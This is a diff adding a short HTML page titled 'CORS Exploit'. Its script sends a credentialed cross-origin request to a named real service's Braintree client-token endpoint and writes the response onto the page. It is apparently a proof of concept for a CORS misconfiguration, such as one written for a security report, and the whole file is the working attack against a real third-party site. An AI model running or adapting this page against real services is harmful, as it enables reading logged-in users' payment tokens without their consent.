@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<body>
+<h2>CORS Exploit</h2>
+<pre id="out"></pre>
+
+<script>
+fetch("https://pro.smallpdf.com/v1/braintree-client-token", {
+  credentials: "include"
+})
+.then(r => r.text())
+.then(d => document.getElementById("out").innerText = d)
+.catch(e => document.getElementById("out").innerText = e);
+</script>
+</body>
+</html>
